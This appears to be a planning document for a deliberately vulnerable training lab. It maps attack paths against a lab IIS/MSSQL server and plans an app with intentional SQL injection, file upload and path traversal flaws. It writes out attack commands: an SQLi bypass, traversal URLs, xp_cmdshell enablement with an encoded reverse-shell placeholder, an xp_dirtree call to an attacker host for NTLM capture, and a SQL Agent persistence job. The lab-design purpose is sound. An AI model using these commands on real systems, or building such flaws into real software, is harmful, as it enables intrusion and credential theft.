# WEB + MSSQL — TTP Planning Notes

Attack surface and planned scenarios for the WEB server (10.2.50.14) and its MSSQL instance.

---

## Current State

| Item | Detail |
|---|---|
| Host | WEB (10.2.50.14) — Windows Server 2022 |
| Services | IIS + ASP.NET 4.5, MSSQL 2019, SSMS |
| Domain | `thruntops.domain` (member) |
| **Gap** | No web application deployed — `wwwroot` is empty |
| **Gap** | No DBA role / MSSQL users configured beyond SA |

---

## Access: Who Can Reach WEB

### RDP (Remote Desktop Users group)

| User | Type | Notes |
|---|---|---|
| `basicuser` | Local | No privileges |
| `thruntops\domainadmin` | Domain Admin | Full local admin via domain admin membership |
| `thruntops\domainuser` | Domain User | Standard access |
| `thruntops\basicdomainuser` | Domain User | Standard access |

### Local accounts

| User | Type | Notes |
|---|---|---|
| `localuser` | Local Admin | LAPS-managed password |
| `webadmin` | Local Admin | IIS/wwwroot owner, CI/CD runner identity |

`primary_user*` / `secondary_user*` accounts do not have RDP on WEB by default.
`domainadmin` RDP access means any `primary_user01` / `secondary_user01` credential compromise (shared password) grants immediate admin access to WEB.

---

## Planned: DBA Role

A `DBA` group will be created in each domain to provide controlled MSSQL access.

| Domain | User | MSSQL Role | Notes |
|---|---|---|---|
| `thruntops.domain` | `primary_user07` | `sysadmin` (SA-equivalent) | Can enable xp_cmdshell, create jobs, etc. |
| `secondary.thruntops.domain` | `secondary_user07` | `db_datareader` on one database | Read-only, no server-level permissions |

**Why this matters:**
- `primary_user07` is the high-value target — sysadmin access leads directly to OS-level RCE via xp_cmdshell
- `secondary_user07` demonstrates the privilege delta and makes impersonation / escalation within SQL meaningful
- Both are reachable via LDAP auth if the app connects to MSSQL with Windows authentication

**Implementation needed:**
- `ludus_ad_content` role: create `DBA` group in both domains, add respective users
- MSSQL post-install: add domain group logins and assign server roles via T-SQL task

---

## Web Application: 3 Planned Vulnerability Scenarios

A single ASP.NET WebForms application will cover all three scenarios. It should be deployable from the GitLab pipeline.

### Scenario A — SQL Injection (T1190)

A login form with an unsanitized query:

```sql
-- Vulnerable query (inline concatenation)
SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
```

**Attack vectors from this one surface:**
- Authentication bypass: `' OR 1=1 --`
- UNION-based data extraction
- Error-based enumeration
- Time-based blind SQLi (`WAITFOR DELAY`)
- Stacked queries → `xp_cmdshell` (if `primary_user07` / SA credentials used by the app)

**Attack path (full chain):**
```
SQLi authentication bypass
  → Stacked query: enable xp_cmdshell
  → xp_cmdshell 'powershell -c <reverse shell>'
  → Shell as MSSQL service account
  → SeImpersonatePrivilege → GodPotato/PrintSpoofer → SYSTEM
```

**MITRE:** T1190, T1059.003, T1548.002

---

### Scenario B — Unrestricted File Upload (T1505.003)

A file upload form that accepts any extension and writes to `wwwroot`:

**Attack path:**
```
Upload shell.aspx to the upload endpoint
  → Browse to http://10.2.50.14/uploads/shell.aspx
  → RCE as IIS AppPool identity (NETWORK SERVICE or webadmin)
  → SeImpersonatePrivilege → SYSTEM
```

**Variants:**
- Double extension bypass: `shell.aspx.jpg` + path traversal
- Content-type bypass: change `Content-Type: image/jpeg` but keep `.aspx` extension

**MITRE:** T1505.003, T1134.001

---

### Scenario C — Directory Traversal (T1083)

A page that reads a file from disk and returns its contents, using a user-controlled path:

```
http://10.2.50.14/view?file=report.txt
  → http://10.2.50.14/view?file=../../../../Windows/win.ini
  → http://10.2.50.14/view?file=../../../../inetpub/wwwroot/web.config
```

`web.config` typically contains MSSQL connection strings in plaintext — reading it recovers SA or app credentials.

**Attack path:**
```
Directory traversal → read web.config
  → Extract MSSQL connection string (SA credentials)
  → Connect to MSSQL from Kali: sqlcmd -S 10.2.50.14 -U sa -P <password>
  → xp_cmdshell → OS RCE
```

**MITRE:** T1083, T1552.001

---

## MSSQL TTPs (standalone, credential-first)

These apply once MSSQL credentials are in hand (via SQLi, traversal, secret leakage from GitLab, or direct access as `primary_user07`).

### xp_cmdshell — OS Command Execution (T1059.003)

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'powershell -enc <base64 reverse shell>';
```

Requires sysadmin. SA or `primary_user07` (planned DBA sysadmin) satisfies this.

---

### NTLM Hash Capture via xp_dirtree (T1557.001)

```sql
-- From any authenticated SQL session
EXEC xp_dirtree '\\10.2.50.250\share';
```

- Responder running on Kali (`10.2.50.250`) captures the NTLM hash of the SQL service account
- If SQL runs as `NETWORK SERVICE` → machine account hash → useful for relay (not cracking)
- If SQL runs as a domain service account → crack offline or relay

Requires only a valid SQL login — does not require sysadmin.

---

### Token Impersonation from IIS (T1134.001 — SeImpersonatePrivilege)

After obtaining a shell via web shell or SQLi RCE, the IIS worker process (`w3wp.exe`) runs as `IIS APPPOOL\DefaultAppPool` or `NETWORK SERVICE`. Both have `SeImpersonatePrivilege`.

```
Shell as NETWORK SERVICE (via web shell or xp_cmdshell)
  → Confirm: whoami /priv → SeImpersonatePrivilege: Enabled
  → Run GodPotato / PrintSpoofer
  → Shell as NT AUTHORITY\SYSTEM
```

**MITRE:** T1134.001, T1548.002

---

### SQL Agent Job — Persistence (T1053.002)

```sql
USE msdb;
EXEC sp_add_job @job_name = 'Maintenance';
EXEC sp_add_jobstep @job_name = 'Maintenance',
    @step_name = 'step1',
    @subsystem = 'CmdExec',
    @command = 'powershell -enc <payload>';
EXEC sp_add_schedule @schedule_name = 'daily', @freq_type = 4, @freq_interval = 1;
EXEC sp_attach_schedule @job_name = 'Maintenance', @schedule_name = 'daily';
EXEC sp_add_jobserver @job_name = 'Maintenance';
```

Requires sysadmin. Provides scheduled persistence on the SQL host.

**MITRE:** T1053.002

---

## Full Attack Chains

### Chain 1 — GitLab → WEB → SYSTEM

```
Compromise webdev (credentials or LDAP brute)
  → Push malicious .gitlab-ci.yml
  → Pipeline deploys shell.aspx to wwwroot (via runner on WEB)
  → RCE as webadmin / NETWORK SERVICE
  → SeImpersonatePrivilege → SYSTEM
```

### Chain 2 — Web SQLi → MSSQL → SYSTEM

```
Discover login page at http://10.2.50.14
  → SQLi authentication bypass
  → Stacked query: enable xp_cmdshell
  → Reverse shell as SQL service account
  → SeImpersonatePrivilege → SYSTEM
```

### Chain 3 — Directory Traversal → Credentials → MSSQL → Lateral Movement

```
Traverse to web.config → recover SA password
  → MSSQL: xp_dirtree → capture NTLM hash of service account
  → Relay or crack → lateral movement to DC (if service account has domain privileges)
```

### Chain 4 — LAPS / domainadmin → RDP → WEB → MSSQL

```
Compromise primary_user01 (shares domainadmin password)
  → RDP to WEB as domainadmin (in Remote Desktop Users)
  → SSMS: connect to local MSSQL as Windows auth → sysadmin
  → xp_cmdshell → persistence
```

---

## Implementation Checklist (not yet done)

**DBA role:**
- [ ] Create `DBA` group in `thruntops.domain` and `secondary.thruntops.domain`
- [ ] Add `primary_user07` to DBA (thruntops), `secondary_user07` to DBA (secondary)
- [ ] Post-deploy T-SQL: `CREATE LOGIN [thruntops\DBA] FROM WINDOWS; ALTER SERVER ROLE sysadmin ADD MEMBER [thruntops\DBA]`
- [ ] Post-deploy T-SQL: `CREATE LOGIN [secondary\DBA] FROM WINDOWS; GRANT CONNECT SQL TO [secondary\DBA]` + db-level read-only on one DB

**Web application:**
- [ ] Write ASP.NET WebForms app covering Scenario A (SQLi login), B (file upload), C (traversal)
- [ ] App connects to MSSQL using SA or `primary_user07` credentials (makes xp_cmdshell reachable via SQLi)
- [ ] Place connection string in `web.config` (readable via Scenario C)
- [ ] Deploy via GitLab pipeline (depends on runner — see GITLAB.md)
- [ ] Document all three scenarios in `docs/vulnerabilities.md`

**MSSQL standalone TTPs:**
- [ ] Document xp_cmdshell scenario in `docs/vulnerabilities.md`
- [ ] Document NTLM capture via xp_dirtree
- [ ] Document token impersonation (SeImpersonatePrivilege) from IIS context
